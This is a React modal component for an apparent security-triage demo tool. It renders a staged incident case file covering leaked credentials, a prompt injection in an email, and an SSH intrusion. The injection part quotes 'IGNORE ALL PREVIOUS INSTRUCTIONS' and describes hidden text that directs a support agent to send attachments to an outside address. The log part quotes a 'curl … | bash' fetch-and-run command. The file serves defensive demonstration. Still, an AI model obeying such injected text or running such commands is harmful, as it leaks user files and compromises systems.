import { useState } from 'react';

export default function CaseFileModal({ isOpen, onClose }) {
  const [copied, setCopied] = useState(false);

  if (!isOpen) return null;

  const caseFileMarkdown = `# EXHIBIT 009 · FORENSIC CASE FILE
INCIDENT: "Invoice 88213 Multi-Surface Compromise"
CHAIN OF CUSTODY HASH: e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
COLLECTED: ${new Date().toUTCString()}
CLASSIFICATION: CONFIDENTIAL // SECURITY INCIDENT AUDIT
TOOL: RECEIPTS (AI Forensic Triage & Trust Primitive)

================================================================================
SURFACE 1: DATA EXPOSURE (LEAK)
--------------------------------------------------------------------------------
Artifact: production.env (commit: a4f81c9)
Status: 10 VERIFIED, 2 UNCONFIRMED (Entropy Ambiguity)
Findings:
  [L1] PostgreSQL Connection String (postgres://acme_app:***@db-prod.internal) [VERIFIED - RFC-3986]
  [L3] Stripe Live API Secret Key ([REDACTED_STRIPE_SECRET_KEY]) [VERIFIED - Stripe Regex]
  [L4] GitHub Personal Access Token ([REDACTED_GITHUB_TOKEN]) [VERIFIED - GitHub Token]
  [L6] JWT Token with Stale Claims (sub: 1234567890, role: Acme Admin) [VERIFIED - Base64URL Decoded]
  [L10] admin123 (Shannon Entropy: 2.75 bits/char) [UNCONFIRMED - Ambiguous test fixture vs password]
Remediation: Secrets masked via Redaction Engine; credential rotation enforced.

================================================================================
SURFACE 2: AGENT HIJACK (X-RAY)
--------------------------------------------------------------------------------
Artifact: email_invoice_88213.eml -> Acme Corporate Support Assistant
Status: 4 VERIFIED (Both Sides Coded-Verified)
Findings:
  [X1] Hidden Channel: 1px font-size zero-contrast white text span
  [X2] Instruction Override: "IGNORE ALL PREVIOUS INSTRUCTIONS"
  [X3] Scope Violation: Exfiltration of customer attachments to exfil@acme-invoices.co
  [X4] Format Override: Suppression of "— Acme Support" audit sign-off
Hijack Chain:
  Untrusted Input B (lines 9-13) ──overrides──▶ Policy A (lines 1-4) ──therefore──▶ Agent exfiltrates files
Remediation: Hardened system prompt immutability policy applied; HTML/CSS sanitizer rule deployed.
Audit Result: NEUTRALIZED (0 surviving hijack chains).

================================================================================
SURFACE 3: INFRASTRUCTURE (FORENSICS)
--------------------------------------------------------------------------------
Artifact: /var/log/auth.log (web01)
Status: 5 VERIFIED, 2 UNCONFIRMED
Findings:
  [F1] SSH Password Guessing against user deploy from 203.0.113.44 (T1110.001) [VERIFIED]
  [F2] Successful authentication following 7 brute force attempts (T1078.003) [VERIFIED]
  [F3] Command and Scripting Interpreter: curl http://198.51.100.7/x.sh | bash (T1059.004) [VERIFIED]
  [F4] Ambiguity: Undecidable origin of 198.51.100.7 [UNCONFIRMED - Honest Unknown]
Remediation: IP 203.0.113.44 firewall blocked; password authentication disabled in sshd_config.

================================================================================
VERDICT SUMMARY
"The attacker didn't pick one surface. Neither does RECEIPTS."
One trust primitive spanning systems, agents, and data. Every claim code-verified.
`;

  const copyMarkdown = async () => {
    await navigator.clipboard.writeText(caseFileMarkdown);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-[rgba(0,0,0,0.75)] backdrop-blur-md p-4 animate-in fade-in duration-200">
      <div
        className="glass w-full max-w-4xl max-h-[90vh] flex flex-col rounded-2xl border border-[rgba(255,255,255,0.12)] shadow-2xl overflow-hidden"
        style={{ background: 'rgba(12,15,22,0.96)' }}
      >
        {/* Header */}
        <div className="flex items-center justify-between p-4 border-b border-[rgba(255,255,255,0.08)] bg-[rgba(255,255,255,0.02)]">
          <div className="flex items-center gap-2.5">
            <span className="w-3 h-3 rounded-full bg-[var(--accent)]" />
            <h2 className="text-base font-bold tracking-tight text-[color:var(--text)]">
              UNIFIED INCIDENT CASE FILE · EXHIBIT 009
            </h2>
            <span className="text-[10px] font-bold px-2 py-0.5 rounded border border-[rgba(53,208,127,0.4)] text-[color:var(--verified)] bg-[rgba(53,208,127,0.1)]">
              ALL SURFACES CORRELATED
            </span>
          </div>

          <div className="flex items-center gap-2">
            <button
              onClick={copyMarkdown}
              className="px-3 py-1 rounded text-xs font-semibold border border-[rgba(34,211,238,0.4)] text-[color:var(--accent)] hover:bg-[rgba(34,211,238,0.1)] transition"
            >
              {copied ? 'Copied ✓' : 'Copy Case File (Markdown)'}
            </button>
            <button
              onClick={onClose}
              className="p-1 rounded text-[color:var(--muted)] hover:text-white transition"
            >
              <svg className="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>

        {/* Pitch Callout Banner */}
        <div className="px-5 py-3 border-b border-[rgba(255,255,255,0.06)] bg-[rgba(34,211,238,0.04)] flex items-center justify-between text-xs">
          <span className="text-[color:var(--text)] italic">
            “The attacker didn’t pick one surface. Neither does RECEIPTS.”
          </span>
          <span className="mono text-[11px] text-[color:var(--muted)]">
            Chain of Custody Hash: <span className="text-[color:var(--accent)]">e3b0c442…b855</span>
          </span>
        </div>

        {/* Surfaces Grid */}
        <div className="flex-1 overflow-y-auto p-5 space-y-4">
          {/* Surface 1: LEAK (Data) */}
          <div className="rounded-xl p-4 bg-[rgba(0,0,0,0.35)] border border-[rgba(255,255,255,0.08)] flex flex-col gap-2">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-[var(--unconfirmed)]" />
                <span className="font-bold text-xs uppercase tracking-wider text-[color:var(--unconfirmed)]">
                  1. Data Surface (LEAK Forensics)
                </span>
                <span className="text-[10px] mono text-[color:var(--muted)]">production.env</span>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-[rgba(53,208,127,0.1)] text-[color:var(--verified)]">
                10 VERIFIED · 2 UNCONFIRMED
              </span>
            </div>
            <p className="text-xs text-[color:var(--text)]">
              Developer committed production credentials to repo: Stripe live key, AWS credentials, and PostgreSQL connection string with plaintext password. Code verifier decoded expired JWT claims and stamped low-entropy passwords UNCONFIRMED.
            </p>
            <div className="flex items-center gap-2 text-[10px] mono text-[color:var(--muted)] pt-1">
              <span className="text-[color:var(--verified)]">✓ Redaction Engine Applied</span>
              <span>·</span>
              <span>Tokens Revoked & Rotated</span>
            </div>
          </div>

          {/* Surface 2: X-RAY (Agents) */}
          <div className="rounded-xl p-4 bg-[rgba(0,0,0,0.35)] border border-[rgba(255,255,255,0.08)] flex flex-col gap-2">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-[var(--critical)]" />
                <span className="font-bold text-xs uppercase tracking-wider text-[color:var(--critical)]">
                  2. Agent Surface (X-RAY Prompt Injection)
                </span>
                <span className="text-[10px] mono text-[color:var(--muted)]">email_invoice_88213.eml</span>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-[rgba(53,208,127,0.1)] text-[color:var(--verified)]">
                4 VERIFIED · NEUTRALIZED
              </span>
            </div>
            <p className="text-xs text-[color:var(--text)]">
              Injected email contained 1px zero-contrast hidden HTML text commanding Acme Support assistant to exfiltrate attachments to <code className="text-[color:var(--critical)]">exfil@acme-invoices.co</code>. Hijack chain proved policy defeat; mitigation loop verified zero surviving attack vectors.
            </p>
            <div className="flex items-center gap-2 text-[10px] mono text-[color:var(--muted)] pt-1">
              <span className="text-[color:var(--verified)]">✓ Hardened Policy Injected</span>
              <span>·</span>
              <span>Regex Sanitizer Deployed</span>
            </div>
          </div>

          {/* Surface 3: FORENSICS (Systems) */}
          <div className="rounded-xl p-4 bg-[rgba(0,0,0,0.35)] border border-[rgba(255,255,255,0.08)] flex flex-col gap-2">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-[var(--accent)]" />
                <span className="font-bold text-xs uppercase tracking-wider text-[color:var(--accent)]">
                  3. Systems Surface (INFRA TRIAGE)
                </span>
                <span className="text-[10px] mono text-[color:var(--muted)]">/var/log/auth.log</span>
              </div>
              <span className="text-[10px] font-bold px-2 py-0.5 rounded bg-[rgba(53,208,127,0.1)] text-[color:var(--verified)]">
                5 VERIFIED · 2 UNCONFIRMED
              </span>
            </div>
            <p className="text-xs text-[color:var(--text)]">
              Attacker conducted SSH brute force from 203.0.113.44, gained session for user deploy, and initiated remote script execution via curl | bash from secondary host 198.51.100.7. Code validator linked findings directly to cited byte lines.
            </p>
            <div className="flex items-center gap-2 text-[10px] mono text-[color:var(--muted)] pt-1">
              <span className="text-[color:var(--verified)]">✓ Attacking IP Blocked</span>
              <span>·</span>
              <span>Password Auth Disabled</span>
            </div>
          </div>
        </div>

        {/* Footer */}
        <div className="p-4 border-t border-[rgba(255,255,255,0.08)] bg-[rgba(0,0,0,0.4)] flex items-center justify-between text-xs">
          <div className="mono text-[10px] text-[color:var(--muted)]">
            One incident case file · Signed SHA-256 chain of custody · 100% On-Device Audit
          </div>
          <button
            onClick={onClose}
            className="px-4 py-1.5 rounded text-xs font-semibold bg-[rgba(255,255,255,0.06)] hover:bg-[rgba(255,255,255,0.12)] text-[color:var(--text)] transition"
          >
            Close
          </button>
        </div>
      </div>
    </div>
  );
}
